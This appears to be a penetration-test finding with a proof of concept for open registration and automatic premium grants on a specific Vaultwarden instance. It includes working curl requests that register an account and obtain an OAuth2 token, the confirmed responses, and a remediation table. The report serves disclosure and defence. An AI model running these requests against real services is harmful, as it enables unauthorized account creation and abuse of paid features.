F-025 — Vaultwarden Open Registration + Auto-Premium

CRITICAL CWE-284
← Back to PoC Index

Overview

The Vaultwarden instance at vaultwarden.premiumalts.to allows anyone on the internet to self-register a new account via POST /api/accounts/register without an invite code, email verification, or rate limiting. Worse, every newly created account is automatically granted premium: true and emailVerified: true — capabilities that are sold commercially. An attacker can create unlimited premium-tier accounts and immediately obtain OAuth2 tokens for them.

Step 1 — Open Registration (No Invite, No Rate Limit)

The registration endpoint accepts any valid email/password pair and returns a successful account creation response. No invite code field is enforced. No CAPTCHA. No rate limiting observed across repeated sequential requests.

Registration Request

curl -s -X POST "https://vaultwarden.premiumalts.to/api/accounts/register" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Attacker User",
    "email": "attacker@evil.com",
    "masterPasswordHash": "BASE64_MASTER_PASSWORD_HASH_HERE",
    "masterPasswordHint": "",
    "key": "BASE64_ENCRYPTED_KEY_HERE",
    "kdf": 0,
    "kdfIterations": 600000
  }'
Confirmed Response — HTTP 200
{
  "id": "59a083df-aff9-4bb9-b637-dbc6bde27c1e",
  "name": "Attacker User",
  "email": "attacker@evil.com",
  "emailVerified": true,
  "premium": true,
  "premiumExpirationDate": null,
  "culture": "en-US",
  "twoFactorEnabled": false,
  "object": "profile"
}
Key fields: "premium": true and "emailVerified": true are set automatically — without any payment, invite, or email confirmation step. Account UUID confirmed: 59a083df-aff9-4bb9-b637-dbc6bde27c1e.

Step 2 — OAuth2 Token Issuance for Newly Registered Account

Immediately after registration, an OAuth2 client_credentials token can be obtained for the new account. This token grants programmatic access to all premium-gated API features.

OAuth2 Token Request

curl -s -X POST "https://vaultwarden.premiumalts.to/identity/connect/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=client_credentials\
&client_id=user.a2bf5129-56ed-49fe-8bf3-c6b6cc06dfc6\
&client_secret=CLIENT_SECRET_HERE\
&scope=api\
&DeviceIdentifier=DEVICE_UUID\
&DeviceType=21\
&DeviceNAme=curl"
Confirmed Response — OAuth Token Issued
{
  "access_token": "eyJhbGciOiJSUzI1NiIsImtpZCI6I...[truncated]",
  "expires_in": 3600,
  "token_type": "Bearer",
  "scope": "api",
  "client_id": "user.a2bf5129-56ed-49fe-8bf3-c6b6cc06dfc6"
}
OAuth2 client_id used: user.a2bf5129-56ed-49fe-8bf3-c6b6cc06dfc6. This is derived from the registered user UUID and confirms the account is fully operational immediately after open self-registration.

Remediation

Control Recommendation Priority
Disable open registration Set SIGNUPS_ALLOWED=false in the Vaultwarden environment configuration. Use invite-only mode (INVITATIONS_ALLOWED=true) and issue invites manually or via admin panel. Critical
Remove auto-premium grant Audit Vaultwarden configuration: ensure premium is not granted by default. Tie premium status to verified payment or admin assignment only. Critical
Enforce email verification Enable REQUIRE_DEVICE_EMAIL=true and configure SMTP so email verification is mandatory before account activation. High
Rate limit registration Add IP-level rate limiting to /api/accounts/register. Consider CAPTCHA for self-serve flows if re-enabled. High
